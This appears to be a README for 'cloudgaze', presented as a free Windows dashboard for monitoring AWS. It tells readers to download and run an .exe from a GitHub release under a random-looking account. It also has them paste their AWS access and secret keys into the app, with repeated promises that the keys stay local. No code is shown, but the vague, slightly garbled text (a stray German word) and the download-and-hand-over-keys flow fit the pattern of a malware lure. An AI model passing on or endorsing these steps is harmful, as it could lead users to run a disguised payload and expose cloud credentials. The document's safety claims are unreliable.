# ☁️ cloudgaze - See your cloud metrics with ease.

[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)] (https://github.com/Roentgenographic-skyline37/cloudgaze/releases)

cloudgaze helps you monitor your AWS infrastructure through a clear dashboard. It works on your machine and reads your AWS data. The software focuses on safety and speed. It provides live updates on your cloud health without complex configurations.

## 📥 How to install this software

You need to visit the project page to get the installer for your computer.

1. Go to the [official release page](https://github.com/Roentgenographic-skyline37/cloudgaze).
2. Look for the Assets section at the bottom of the latest release post.
3. Select the file that ends in .exe for Windows.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to start the installation.
6. Follow the prompts on your screen.

## 🖥️ System Requirements

Your computer must meet these basic needs to run the dashboard smoothy.

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM or more.
* Storage: 200MB of free disk space.
* Internet: An active connection to reach AWS servers.
* Credentials: A valid AWS Access Key and Secret Key with read-only access.

## 🗝️ Setup your credentials

cloudgaze connects to your AWS account using your keys. You must provide these credentials so the app can fetch your resource data.

1. Open the app after installation.
2. Locate the Settings menu in the top corner.
3. Choose the Credentials tab.
4. Copy your Access Key ID and Secret Access Key from your AWS Identity and Access Management console.
5. Paste these values into the fields provided in the app.
6. Click the Save button to store the keys locally on your device.

The app uses these keys only to read data. It does not change any settings in your cloud account. Your keys stay on your computer and do not travel to other servers.

## 📊 Using the dashboard

Once you enter your keys, the dashboard populates with your resource list. You will see several sections on the main screen.

### Resource Overview
This area displays a summary of your active services. It shows instances, storage buckets, and load balancers. Each item has a status light. Green means the resource runs correctly. Red indicates an issue that needs your attention.

### Live Metrics
This section displays live charts of your data. You can watch the traffic move through your systems in real time. The graphs update every few seconds to keep you informed of current activity.

### Search and Filter
Use the search bar at the top of the app to find specific items. Type the name or ID of a service to view its details. You can also click the filter icon to hide unused resources.

## 🛡️ Security and Privacy

cloudgaze treats your data with care. It functions as a read-only tool. This means the software has no permission to alter, delete, or add resources to your cloud account. The connection to AWS happens through encrypted channels to keep your information private. The software stores your local configuration files in a hidden folder on your hard drive. No part of this software sends your AWS keys to external parties.

## 🔧 Frequently Asked Questions

### Does this app charge money for access?
No. cloudgaze is open-source and free for all users.

### Can I run this with multiple AWS accounts?
Yes. You can save multiple profiles in the settings menu. Switch between them using the dropdown list in the top navigation bar.

### My dashboard shows empty data. What should I do?
First, check your internet connection. Next, verify that your AWS credentials possess read-only permissions. If the issues persist, restart the app and ensure your region settings match the region where your resources live.

### Can I export the data for reports?
Yes. Each chart includes a menu icon. Click this icon to download your current view as a report file.

### How do I update the software?
The app checks for new versions when you open it. If a new version exists, a notification bar erscheint at the top of the screen. Click the link to download the latest installer and follow the same steps you used for the first installation.

### Does the app store my AWS logs?
The app only holds temporary logs to help you fix errors. You can clear these logs at any time through the Settings menu under the Maintenance tab.

## 🤝 Getting Help

If you encounter bugs, reach out through the project page. Provide a description of what you see and the steps you took before the error happened. Explain your version of Windows to help identify the issue. Check the existing list of issues to see if someone else reported a similar problem. Clear communication helps to find solutions faster.